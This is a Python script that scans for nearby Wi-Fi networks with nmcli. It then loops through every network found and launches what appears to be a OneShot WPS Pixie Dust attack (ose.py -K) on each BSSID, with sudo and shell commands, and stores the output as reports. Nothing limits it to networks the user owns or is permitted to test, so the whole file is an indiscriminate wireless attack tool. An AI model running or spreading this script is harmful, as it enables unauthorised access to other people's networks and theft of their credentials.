#!venv/bin/python

import nmcli
import os
import subprocess
import time
import signal
import sys


INTERFACE = os.getenv("INTERFACE")
TIMEOUT = 60

def scan(interface: str, rescan: bool=True):
    nmcli.device.wifi_rescan(ifname=interface)
    return nmcli.device.wifi(ifname=interface, rescan=rescan)


def main_loop():
    while True:
        print("The outputs will be saved in the start script directory (ultimatetrollium/reports)")
        time.sleep(3)

        networks = scan(INTERFACE, True)

        print("Networks found:\n")
        for network in networks:
            print("--------")
            if network.ssid != "":
                print(f"{network.ssid}")
            else:
                print("(no name)")
            print(f"{network.bssid}\n")

        for network in networks:
            if network.ssid != "":
                ssid = network.ssid
            else:
                ssid = "(no name)"

            print(f"Target: {ssid}, {network.bssid}\n")

            # The interface should always restart before running the attack
            subprocess.run(f"sudo ifconfig {INTERFACE} down", shell=True)
            subprocess.run(f"sudo iwconfig {INTERFACE} mode managed", shell=True)
            subprocess.run(f"sudo ifconfig {INTERFACE} up", shell=True)

            subprocess.run(f"timeout {TIMEOUT} sudo ../ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)

        
if __name__ == "__main__":
    main_loop()
